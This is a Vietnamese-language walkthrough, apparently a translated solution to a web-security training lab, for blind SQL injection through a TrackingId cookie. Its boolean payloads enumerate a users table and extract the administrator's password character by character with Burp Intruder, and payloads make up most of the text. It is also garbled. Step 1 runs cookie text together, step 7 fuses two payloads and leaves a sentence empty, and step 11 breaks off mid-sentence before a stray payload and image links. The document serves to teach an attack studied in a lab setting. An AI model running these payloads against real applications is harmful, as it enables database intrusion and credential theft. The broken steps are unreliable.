# Blind SQL injection with conditional responses

1. Truy cập trang chủ của cửa hàng và sử dụng Burp Suite để chặn và sửa đổi yêu cầu chứa `TrackingIdTrackingId=xyz`
    
    cookie. Để đơn giản, giả sử giá trị gốc của cookie là
    
    .
    
2. Hãy chỉnh sửa `TrackingId`cookie, thay đổi nội dung thành:`TrackingId=xyz' AND '1'='1`
    
    Hãy kiểm tra xem `Welcome back`thông báo có xuất hiện trong phản hồi hay không.
    
3. Bây giờ hãy đổi nó thành:`TrackingId=xyz' AND '1'='2`
    
    Hãy xác minh rằng `Welcome back`thông báo đó không xuất hiện trong phản hồi. Điều này minh họa cách bạn có thể kiểm tra một điều kiện boolean đơn lẻ và suy ra kết quả.
    
4. Bây giờ hãy đổi nó thành:`TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
    
    Xác minh điều kiện là đúng, khẳng định rằng có một bảng tên là `users`.
    
5. Bây giờ hãy đổi nó thành:`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
    
    Xác minh điều kiện là đúng, khẳng định rằng có một người dùng tên là `administrator`.
    
6. Bước tiếp theo là xác định mật khẩu của người `administrator`dùng có bao nhiêu ký tự. Để làm điều này, hãy thay đổi giá trị thành:`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
    
    Điều kiện này phải đúng, xác nhận rằng mật khẩu có độ dài lớn hơn 1 ký tự.
    
7. Gửi một loạt các giá trị tiếp theo để kiểm tra độ dài mật khẩu khác nhau. Gửi:`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='aTrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`
    
    Sau đó gửi:
    
    Và cứ thế tiếp tục. Bạn có thể thực hiện việc này thủ công bằng Burp Repeater, vì độ dài thường ngắn. Khi điều kiện không còn đúng nữa (tức là khi thông `Welcome back`báo biến mất), bạn đã xác định được độ dài của mật khẩu, thực tế là 20 ký tự.
    
8. Sau khi xác định độ dài của mật khẩu, bước tiếp theo là kiểm tra ký tự ở mỗi vị trí để xác định giá trị của nó. Việc này liên quan đến số lượng yêu cầu lớn hơn nhiều, vì vậy bạn cần sử dụng Burp Intruder. Gửi yêu cầu bạn đang thực hiện đến Burp Intruder bằng cách sử dụng menu ngữ cảnh.
9. Trong Burp Intruder, hãy thay đổi giá trị của cookie thành:`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
    
    Phương pháp này sử dụng `SUBSTRING()`hàm để trích xuất một ký tự duy nhất từ mật khẩu và so sánh nó với một giá trị cụ thể. Cuộc tấn công của chúng ta sẽ lần lượt duyệt qua từng vị trí và giá trị có thể có, kiểm tra từng giá trị một.
    
10. Đặt các dấu vị trí tải trọng xung quanh ký tự cuối cùng `a`trong giá trị cookie. Để làm điều này, chỉ cần chọn `a`, và nhấp vào nút **Thêm §** . Sau đó, bạn sẽ thấy giá trị cookie như sau (lưu ý các dấu vị trí tải trọng):`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
11. Để kiểm tra ký tự ở từng vị trí, bạn cần gửi các dữ liệu phù hợp vào vị trí dữ liệu đã xác định. Bạn có thể giả định rằng mật khẩu

' AND (SELECT 'A' FROM users WHERE username='administrator' AND LENGTH(password)=1)='A

![image.png](Blind%20SQL%20injection%20with%20conditional%20responses/image.png)

![image.png](Blind%20SQL%20injection%20with%20conditional%20responses/image%201.png)
